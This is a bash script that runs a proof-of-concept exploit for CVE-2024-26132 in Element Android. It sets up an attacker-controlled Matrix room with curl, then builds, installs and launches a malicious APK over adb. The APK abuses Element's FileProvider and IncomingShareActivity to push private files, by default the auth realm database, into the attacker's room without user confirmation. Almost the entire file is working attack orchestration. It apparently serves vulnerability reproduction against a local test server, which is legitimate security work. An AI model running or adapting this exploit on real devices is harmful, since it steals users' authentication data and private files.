#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$SCRIPT_DIR/../.."
EVIDENCE_FILE="$ROOT_DIR/exploit_evidence.txt"
MALICIOUS_APP_DIR="$SCRIPT_DIR/malicious_app"
APK_PATH="$MALICIOUS_APP_DIR/dist/element-exfiltrate.apk"
ATTACKER_PKG="com.example.elementexfiltrate"
ATTACKER_ACTIVITY="com.example.elementexfiltrate.MainActivity"
ELEMENT_PKG="im.vector.app.debug"

# Target file to exfiltrate (default: auth database)
TARGET_FILE="${TARGET_FILE:-matrix-sdk-auth.realm}"

# Matrix server configuration
MATRIX_SERVER="${MATRIX_SERVER:-http://localhost:8008}"
BOB_USER="${BOB_USER:-bob}"
BOB_PASS="${BOB_PASS:-bobpass123}"
ALICE_USER="${ALICE_USER:-alice}"
ALICE_PASS="${ALICE_PASS:-alicepass123}"
ALICE_USER_ID="@${ALICE_USER}:localhost"

# Target Matrix room ID (will be auto-created if not provided)
ROOM_ID="${ROOM_ID:-}"

# Debug function
debug_log() {
    echo "[DEBUG] $(date '+%H:%M:%S') - $1" >&2
}

# Check if Element is installed
debug_log "Checking if Element package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}$"; then
    echo "ERROR: Element package '${ELEMENT_PKG}' is not installed!"
    echo "Available packages containing 'vector':"
    adb shell pm list packages | grep -i vector || echo "None found"
    echo "This script cannot continue without Element installed."
    exit 1
fi
debug_log "Element package found: ${ELEMENT_PKG}"

# STEP 1: Create attacker-controlled room using Bob's account
if [ -z "$ROOM_ID" ]; then
    debug_log "No ROOM_ID provided, creating attacker-controlled room..."

    # Login as Bob (attacker)
    debug_log "Logging in as Bob (attacker)..."
    BOB_TOKEN=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/login" \
        -H "Content-Type: application/json" \
        -d "{\"type\":\"m.login.password\",\"user\":\"${BOB_USER}\",\"password\":\"${BOB_PASS}\"}" \
        | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

    if [ -z "$BOB_TOKEN" ]; then
        echo "ERROR: Failed to login as Bob - Matrix server may not be available"
        echo "You can manually set ROOM_ID environment variable to skip room creation"
        exit 1
    fi
    debug_log "Bob logged in successfully"

    # Create exfiltration room as Bob
    debug_log "Creating exfiltration room as Bob..."
    ROOM_ID=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/createRoom" \
        -H "Authorization: Bearer ${BOB_TOKEN}" \
        -H "Content-Type: application/json" \
        -d '{"name":"Exfiltrated Data Drop","preset":"private_chat","visibility":"private","topic":"CVE-2024-26132 File Exfiltration Test"}' \
        | grep -o '"room_id":"[^"]*' | cut -d'"' -f4)

    if [ -z "$ROOM_ID" ]; then
        echo "ERROR: Failed to create room"
        exit 1
    fi
    debug_log "Created room: ${ROOM_ID}"

    # STEP 2: Invite Alice to the room
    debug_log "Inviting Alice to the room..."
    INVITE_RESULT=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/rooms/${ROOM_ID}/invite" \
        -H "Authorization: Bearer ${BOB_TOKEN}" \
        -H "Content-Type: application/json" \
        -d "{\"user_id\":\"${ALICE_USER_ID}\"}")
    debug_log "Invited Alice to room"

    sleep 1

    # STEP 3: Login as Alice and join the room
    debug_log "Logging in as Alice..."
    ALICE_TOKEN=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/login" \
        -H "Content-Type: application/json" \
        -d "{\"type\":\"m.login.password\",\"user\":\"${ALICE_USER}\",\"password\":\"${ALICE_PASS}\"}" \
        | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

    if [ -n "$ALICE_TOKEN" ]; then
        debug_log "Alice logged in successfully"

        # Alice joins the room
        debug_log "Alice joining the room..."
        JOIN_RESULT=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/rooms/${ROOM_ID}/join" \
            -H "Authorization: Bearer ${ALICE_TOKEN}" \
            -H "Content-Type: application/json" \
            -d '{}')
        debug_log "Alice joined room ${ROOM_ID}"

        # Send confirmation message from Alice
        debug_log "Alice sending confirmation message..."
        MSG_RESULT=$(curl -s -X POST "${MATRIX_SERVER}/_matrix/client/v3/rooms/${ROOM_ID}/send/m.room.message" \
            -H "Authorization: Bearer ${ALICE_TOKEN}" \
            -H "Content-Type: application/json" \
            -d '{"msgtype":"m.text","body":"Alice joined the room - CVE-2024-26132 attack setup complete"}')
        debug_log "Alice sent confirmation message"

        # Give Element time to sync
        debug_log "Waiting for Element to sync the new room..."
        sleep 2
    fi
fi

debug_log "Target room ID: ${ROOM_ID}"

# Build the malicious APK
debug_log "Building malicious APK..."
cd "$MALICIOUS_APP_DIR"
if [ -f "build.sh" ]; then
    debug_log "Running build.sh to create malicious APK..."
    if ./build.sh; then
        debug_log "APK build completed successfully"
    else
        echo "ERROR: Failed to build malicious APK"
        exit 1
    fi
else
    echo "ERROR: build.sh not found in malicious_app directory"
    exit 1
fi
cd - >/dev/null

# Uninstall any existing malicious APK
debug_log "Uninstalling any existing malicious APK..."
adb uninstall "$ATTACKER_PKG" >/dev/null 2>&1 || true

# Check if the malicious APK was built
debug_log "Checking if malicious APK exists..."
if [ ! -f "$APK_PATH" ]; then
    echo "ERROR: Attacker APK not found at: $APK_PATH"
    exit 1
fi
debug_log "Malicious APK found: $APK_PATH ($(ls -lh "$APK_PATH" | awk '{print $5}'))"

# Install the malicious APK
debug_log "Installing malicious APK..."
if ! adb install "$APK_PATH" >/dev/null 2>&1; then
    echo "ERROR: Failed to install malicious APK"
    adb install "$APK_PATH" 2>&1 | head -10
    exit 1
fi
debug_log "Malicious APK installation completed"

# Verify package is installed
debug_log "Verifying malicious package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ATTACKER_PKG}$"; then
    echo "ERROR: Malicious package installation failed"
    exit 1
fi
debug_log "Malicious package verified: ${ATTACKER_PKG}"

# Launch the exploit
debug_log "Launching CVE-2024-26132 Element file exfiltration exploit..."
debug_log "Target file: ${TARGET_FILE}"
debug_log "Target room: ${ROOM_ID}"

if ! adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
    --es target_file "$TARGET_FILE" \
    --es room_id "$ROOM_ID" >/dev/null 2>&1; then
    echo "ERROR: Failed to start malicious app activity"
    exit 1
fi
debug_log "CVE-2024-26132 exploit launched successfully"

# Wait for the exploit to execute
debug_log "Waiting for exploit to execute..."
sleep 3

# Check if Element responded
debug_log "Checking if Element processed the file exfiltration..."
ELEMENT_RUNNING=$(adb shell pidof "$ELEMENT_PKG" 2>/dev/null || echo "")
if [ -n "$ELEMENT_RUNNING" ]; then
    debug_log "SUCCESS: Element is running (PID: $ELEMENT_RUNNING)"
    debug_log "This indicates the exploit triggered Element's IncomingShareActivity"
    EXPLOIT_SUCCESS=true
else
    debug_log "WARNING: Element process not detected"
    EXPLOIT_SUCCESS=false
fi

# Get Android version info
debug_log "Getting Android version info..."
ANDROID_VERSION=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' || echo "unknown")
ANDROID_SDK=$(adb shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r' || echo "unknown")

# Get Element version
ELEMENT_VERSION=$(adb shell dumpsys package "$ELEMENT_PKG" 2>/dev/null | sed -n 's/.*versionName=\([^ ]*\).*/\1/p' | tr -d '\r' || echo "unknown")

# Create evidence file
debug_log "Creating evidence file..."
: > "$EVIDENCE_FILE"
echo "CVE_2024_26132_FILE_EXFILTRATION=true" >> "$EVIDENCE_FILE"
echo "ELEMENT_VERSION=${ELEMENT_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
echo "EXPLOIT_SUCCESS=${EXPLOIT_SUCCESS:-false}" >> "$EVIDENCE_FILE"
echo "FILE_EXFILTRATION_ATTACK=true" >> "$EVIDENCE_FILE"
echo "TARGET_FILE=${TARGET_FILE}" >> "$EVIDENCE_FILE"
echo "TARGET_ROOM=${ROOM_ID}" >> "$EVIDENCE_FILE"

if [[ "${EXPLOIT_SUCCESS:-false}" == "true" ]]; then
    echo "FILE_EXFILTRATION_CONFIRMED=true" >> "$EVIDENCE_FILE"
    echo "INCOMING_SHARE_ACTIVITY_LAUNCHED=true" >> "$EVIDENCE_FILE"
else
    echo "FILE_EXFILTRATION_CONFIRMED=false" >> "$EVIDENCE_FILE"
    echo "INCOMING_SHARE_ACTIVITY_LAUNCHED=false" >> "$EVIDENCE_FILE"
fi

# Create log file
LOG_FILE="$SCRIPT_DIR/element_exfiltrate_log.log"
debug_log "Creating comprehensive vulnerability test log..."

{
    echo "CVE-2024-26132 Element Android File Exfiltration Vulnerability Test"
    echo "Timestamp: $(date -u +%FT%TZ)"
    echo "Android: $ANDROID_VERSION (API $ANDROID_SDK)"
    echo "Attacker Package: $ATTACKER_PKG"
    echo "Target Package: $ELEMENT_PKG"
    echo "Element Version: $ELEMENT_VERSION"
    echo "Vulnerability: File exfiltration via FileProvider (CVE-2024-26132)"
    echo "Target File: $TARGET_FILE"
    echo "Target Room: $ROOM_ID"
    echo "Result: ${EXPLOIT_SUCCESS:-false}"
    echo ""
    echo "--- Exploit Details ---"
    echo "The malicious app exploits Element's FileProvider vulnerability by:"
    echo "1. Crafting a content:// URI to Element's private FileProvider"
    echo "2. Targeting IncomingShareActivity with ACTION_SEND"
    echo "3. Using EXTRA_SHORTCUT_ID to specify the target Matrix room"
    echo "4. Exfiltrating sensitive files from /data/data/im.vector.app/files/"
    echo ""
    echo "--- Expected Result ---"
    echo "Element should send the file '$TARGET_FILE' to room '$ROOM_ID' without user interaction"
    echo "This demonstrates how third-party apps can exfiltrate Element's private data"
    echo ""
    echo "--- Test Evidence ---"
    cat "$EVIDENCE_FILE"
} > "$LOG_FILE"

echo ""
echo "🚨 CVE-2024-26132 Element Android File Exfiltration Exploit Complete!"
echo "========================================================================"
echo "Exploit Evidence: $EVIDENCE_FILE"
echo "Test Log: $LOG_FILE"
echo ""
if [[ "${EXPLOIT_SUCCESS:-false}" == "true" ]]; then
    echo "✅ SUCCESS: Element was launched, indicating exploit triggered"
    echo "📱 Check Element app and room $ROOM_ID for the exfiltrated file"
    echo "🔓 This demonstrates the file exfiltration vulnerability"
else
    echo "❌ WARNING: Element process not detected after exploit"
    echo "📱 Check Element app and room manually to verify if exploit worked"
fi
echo ""
echo "💡 Expected behavior: File '$TARGET_FILE' appears in room without user confirmation"

debug_log "CVE-2024-26132 exploit script completed successfully"
